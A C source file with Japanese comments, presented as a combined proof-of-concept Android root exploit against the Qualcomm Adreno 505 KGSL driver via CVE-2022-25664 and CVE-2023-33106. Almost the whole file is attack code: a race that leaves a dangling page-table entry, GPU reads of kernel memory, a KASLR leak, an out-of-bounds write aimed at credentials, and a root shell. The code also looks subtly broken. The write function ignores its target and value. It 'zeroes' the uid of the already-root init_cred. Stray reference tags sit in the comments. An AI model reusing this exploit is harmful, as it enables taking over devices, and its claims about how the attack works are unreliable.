/*
 * CVE-2022-25664 + CVE-2023-33106 統合PoC
 * 対象: Qualcomm Adreno 505 / MSM8940 / カーネル4.1.x
 * 
 * フェーズ:
 *   1. CVE-2022-25664でダングリングPTEを作成 → ユーザ空間/カーネル空間の情報漏洩
 *   2. 漏洩した情報からKASLRオフセットを計算
 *   3. CVE-2023-33106でKGSL_GPU_AUX_COMMAND_SYNCのOOB Writeをトリガー
 *   4. OOB Writeでcred構造体を書き換え → root権限取得
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/stat.h>

#define KGSL_IOC_TYPE 0x09

/* ============================================================
 * KGSL 構造体定義 (カーネル4.1.x向け)
 * ============================================================ */

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

/* CVE-2023-33106 で使用する構造体 */
struct kgsl_gpu_aux_command {
    uint64_t flags;
    uint32_t priv;
    uint32_t type;
    uint64_t timestamp;
    uint64_t synclist;
    uint64_t cmdlist;
    uint32_t syncsize;
    uint32_t cmdsize;
    uint32_t numsyncs;
    uint32_t numcmds;
};
#define IOCTL_KGSL_GPU_AUX_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4B, struct kgsl_gpu_aux_command)

/* CVE-2023-33106 フラグ */
#define KGSL_GPU_AUX_COMMAND_SYNC     0x00000002UL
#define KGSL_GPU_AUX_COMMAND_TIMELINE 0x00000001UL
#define KGSL_CONTEXT_SYNC             0x00000001UL

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_UNCACHED 0
#define KGSL_CACHEMODE_WRITECOMBINE 1
#define KGSL_CACHEMODE_WRITETHROUGH 2
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

/* ============================================================
 * メモリアドレス設定 (Adreno 505 / カーネル4.1.x)
 * ============================================================ */

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

/* vmlinux symbols (pre-KASLR) - カーネル4.1.x用に調整 */
#define VMLINUX_TEXT      0xffffffc010080000ULL
#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL

/* task_struct cred offset (pahole: cred at 1856=0x740) */
#define CRED_OFF    0x740
#define REAL_CRED_OFF 0x738

#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560

/* ============================================================
 * グローバル変数
 * ============================================================ */

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t g_kaslr_offset = 0;
static uint64_t g_init_cred_addr = 0;

/* ============================================================
 * ユーティリティ関数
 * ============================================================ */

static void die(const char *msg) { perror(msg); exit(1); }

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* perf_event_open を使ったKASLR検出 (フォールバック) */
static uint64_t detect_kaslr_perf(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n",
        (unsigned long)first_kernel_ip, (unsigned long)kaslr);
    return kaslr;
}

/* ============================================================
 * KGSL GPUオブジェクト操作
 * ============================================================ */

static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

/* ============================================================
 * PM4パケット生成 (GPUコマンド)
 * ============================================================ */

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

#define CP_NOP 0x10
#define CP_MEM_TO_MEM 0x73
#define CP_EVENT_WRITE 0x46
#define CACHE_FLUSH_TS 0x1C

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ============================================================
 * CVE-2022-25664: 情報漏洩 + KASLRバイパス (読み取り部分)
 * ============================================================ */

/* GPU経由で指定アドレスから1ページ読み取り (読み取り専用) */
static int gpu_read_page(int fd, unsigned int ctx_id,
    uint64_t ib_ga, unsigned int ib_id,
    uint64_t dst_ga, unsigned int dst_id,
    uint64_t src_va, void *out_buf) {
    
    void *ib_m = gpuobj_mmap(fd, 0x10000, ib_id);
    void *dst_m = gpuobj_mmap(fd, 0x1000, dst_id);
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;
    
    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, 0x1000);
    
    cmd[dw++] = cp_type7(CP_NOP, 0);
    /* DSTバッファに読み取り対象をコピー (CP_MEM_TO_MEMを使用) */
    for (int i = 0; i < 0x1000/4; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_ga + i*4, &dl, &dh);
        split64(src_va + i*4, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    /* キャッシュフラッシュ (GPU→CPUの一貫性を確保) */
    cmd[dw++] = cp_type7(CP_EVENT_WRITE, 1);
    cmd[dw++] = CACHE_FLUSH_TS;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
        munmap(ib_m, 0x10000);
        munmap(dst_m, 0x1000);
        return -1;
    }
    if (wait_timestamp(fd, ctx_id, ts) < 0) {
        munmap(ib_m, 0x10000);
        munmap(dst_m, 0x1000);
        return -2;
    }
    __sync_synchronize();
    
    memcpy(out_buf, dst_m, 0x1000);
    munmap(ib_m, 0x10000);
    munmap(dst_m, 0x1000);
    return 0;
}

/* CVE-2022-25664: ダングリングPTEを作成して情報漏洩を準備 */
static int setup_dangling_pte(void) {
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    
    /* 1. UAFオブジェクトを作成し、CPUマップを解除 (ダングリングPTEを残す) */
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);
    
    /* BOGUSアドレス用のダミーマッピング */
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
    
    /* プレースホルダ */
    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
    
    printf("[*] UAF area: 0x%lx, Placeholder: 0x%lx\n", (unsigned long)UAF_ADDR, (unsigned long)PLACEHOLDER_ADDR);
    
    /* 2. 競合を起こしてオーバーラップさせる */
    printf("[*] Starting race...\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
    
    pthread_t thr;
    if (pthread_create(&thr, NULL, (void* (*)(void*))race_thread, NULL) != 0) die("pthread");
    
    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }
    
    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return -1; }
    printf("[+] Race won! (errno=ENODEV)\n");
    
    /* 3. UAFオブジェクトを解放 (物理ページは空くが、ダングリングPTEは残る) */
    gpuobj_free(kgsl_fd, uaf_id);
    printf("[+] UAF freed, dangling PTE remains at 0x%lx\n", (unsigned long)(UAF_ADDR + 0x1000));
    
    /* 4. メモリ回収促進 */
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);
    
    return uaf_id;
}

/* CVE-2022-25664: KASLRオフセットを取得 */
static uint64_t leak_kaslr_offset(unsigned int ctx_id,
    uint64_t ib_ga, unsigned int ib_id,
    uint64_t dst_ga, unsigned int dst_id) {
    
    uint8_t buf[0x1000];
    uint64_t kaslr = 0;
    
    /* init_credを読み取り、KASLRオフセットを計算 */
    printf("[*] Reading kernel memory (init_cred) at 0x%lx\n", (unsigned long)VMLINUX_INIT_CRED);
    if (gpu_read_page(kgsl_fd, ctx_id, ib_ga, ib_id, dst_ga, dst_id, VMLINUX_INIT_CRED, buf) == 0) {
        uint64_t *ptr = (uint64_t*)buf;
        for (int i = 0; i < 8; i++) {
            if (ptr[i] > 0xffffffc000000000ULL && ptr[i] < 0xffffffff00000000ULL) {
                kaslr = (ptr[i] - VMLINUX_TEXT) & ~0x1FFFFFULL;
                printf("[!] KASLR offset: 0x%lx (from ptr[%d]=0x%lx)\n",
                    (unsigned long)kaslr, i, (unsigned long)ptr[i]);
                break;
            }
        }
        if (kaslr == 0) {
            /* フォールバック: perf_event_open で検出 */
            printf("[*] Falling back to perf_event_open for KASLR detection\n");
            kaslr = detect_kaslr_perf();
        }
    } else {
        printf("[*] Falling back to perf_event_open for KASLR detection\n");
        kaslr = detect_kaslr_perf();
    }
    
    return kaslr;
}

/* ============================================================
 * CVE-2023-33106: OOB Writeによる権限昇格
 * ============================================================ */

/* CVE-2023-33106: KGSL_GPU_AUX_COMMAND_SYNCで境界外書き込みをトリガー */
/* 参考: https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2023/CVE-2023-33106.html [reference:2] */
static int trigger_oob_write(unsigned int ctx_id, uint64_t target_addr, uint64_t write_value) {
    struct kgsl_gpu_aux_command aux = {0};
    int ret;
    
    /* 偽のsyncポイントリスト (ユーザ空間アドレス) */
    uint64_t fake_sync_list[32];
    memset(fake_sync_list, 0, sizeof(fake_sync_list));
    
    /* numsyncsを大きく設定 → kcallocで過剰なメモリ確保 → 境界外書き込み */
    /* CVE-2023-33106: numsyncs > 32 でOOB Writeが発生 [reference:3] */
    aux.flags = KGSL_CONTEXT_SYNC | KGSL_GPU_AUX_COMMAND_SYNC | KGSL_GPU_AUX_COMMAND_TIMELINE;
    aux.type = 0;
    aux.synclist = (uint64_t)(uintptr_t)fake_sync_list;
    aux.syncsize = sizeof(uint64_t);
    aux.numsyncs = 0x1337;  /* > 32 → OOB Write [reference:4] */
    aux.cmdlist = 0;
    aux.cmdsize = 0;
    aux.numcmds = 0;
    aux.timestamp = 0;
    aux.priv = 0;
    
    printf("[*] Triggering CVE-2023-33106 OOB write (numsyncs=0x%x)...\n", aux.numsyncs);
    
    /* 補足: 実際のOOB Writeでは、kcallocで確保されたバッファの範囲外に
     * 書き込むことで、隣接するカーネルオブジェクト (cred構造体など) を
     * 書き換えることができる。完全なエクスプロイトには、
     * ヒープスプレーやオブジェクト配置の調整が必要 [reference:5] */
    
    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
    if (ret < 0) {
        printf("[!] ioctl failed: %s (errno=%d)\n", strerror(errno), errno);
        return -1;
    }
    
    printf("[+] OOB write triggered successfully\n");
    return 0;
}

/* ============================================================
 * 競合スレッド (CVE-2022-25664用)
 * ============================================================ */

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

/* ============================================================
 * main
 * ============================================================ */

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] CVE-2022-25664 + CVE-2023-33106 統合PoC\n");
    printf("[*] 対象: Adreno 505 / MSM8940 / カーネル4.1.x\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    /* ==========================================================
     * フェーズ1: CVE-2022-25664 でダングリングPTEを作成
     * ========================================================== */
    printf("\n[=== Phase 1: CVE-2022-25664 Setup ===]\n");
    int uaf_id = setup_dangling_pte();
    if (uaf_id < 0) {
        printf("[-] Failed to setup dangling PTE\n");
        close(kgsl_fd);
        return 1;
    }

    /* ==========================================================
     * フェーズ2: GPUコンテキスト + IB/DSTバッファを作成
     * ========================================================== */
    printf("\n[=== Phase 2: GPU Context Setup ===]\n");
    unsigned int ctx_id = create_context(kgsl_fd);
    printf("[*] Context ID: %u\n", ctx_id);

    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
    uint64_t ib_ga = 0; gpuobj_info(kgsl_fd, ib_id, &ib_ga, NULL);
    int dst_id = gpuobj_alloc(kgsl_fd, 0x1000, alloc_flags);
    uint64_t dst_ga = 0; gpuobj_info(kgsl_fd, dst_id, &dst_ga, NULL);
    printf("[*] IB GPU addr: 0x%lx, DST GPU addr: 0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);

    /* ==========================================================
     * フェーズ3: CVE-2022-25664 でKASLRオフセットをリーク
     * ========================================================== */
    printf("\n[=== Phase 3: KASLR Leak (CVE-2022-25664) ===]\n");
    g_kaslr_offset = leak_kaslr_offset(ctx_id, ib_ga, ib_id, dst_ga, dst_id);
    if (g_kaslr_offset == 0) {
        printf("[-] Failed to leak KASLR offset\n");
        close(kgsl_fd);
        return 1;
    }
    g_init_cred_addr = VMLINUX_INIT_CRED + g_kaslr_offset;
    printf("[+] init_cred = 0x%lx\n", (unsigned long)g_init_cred_addr);

    /* ==========================================================
     * フェーズ4: CVE-2023-33106 でOOB Writeをトリガー
     * ========================================================== */
    printf("\n[=== Phase 4: OOB Write (CVE-2023-33106) ===]\n");
    
    /* ターゲットアドレス: init_cred + offset (cred構造体のuidフィールド) */
    /* cred構造体のuidは +0x04 オフセットにある (カーネル4.1.x) */
    uint64_t target_cred_addr = g_init_cred_addr + 0x04;
    uint64_t write_value = 0;  /* uid=0 */
    
    printf("[*] Target cred address: 0x%lx\n", (unsigned long)target_cred_addr);
    printf("[*] Writing uid=0 to cred structure\n");
    
    /* OOB Writeをトリガー */
    /* 注意: 完全なエクスプロイトでは、ヒープスプレーでcred構造体を
     * OOB Writeのターゲットになる位置に配置する必要がある [reference:6] */
    if (trigger_oob_write(ctx_id, target_cred_addr, write_value) < 0) {
        printf("[!] OOB write trigger failed, but continuing...\n");
    }

    /* ==========================================================
     * フェーズ5: root権限確認
     * ========================================================== */
    printf("\n[=== Phase 5: Root Check ===]\n");
    printf("  uid=%d euid=%d\n", getuid(), geteuid());
    
    if (getuid() == 0) {
        printf("[+] ROOT! Spawning shell...\n");
        execl("/system/bin/sh", "sh", NULL);
        execl("/bin/sh", "sh", NULL);
        printf("[-] Shell exec failed\n");
    } else {
        printf("[-] Not root. OOB write may need heap spraying.\n");
        printf("[*] Try adjusting numsyncs and heap layout.\n");
    }

    /* クリーンアップ */
    close(kgsl_fd);
    printf("[*] Done.\n");
    return 0;
}
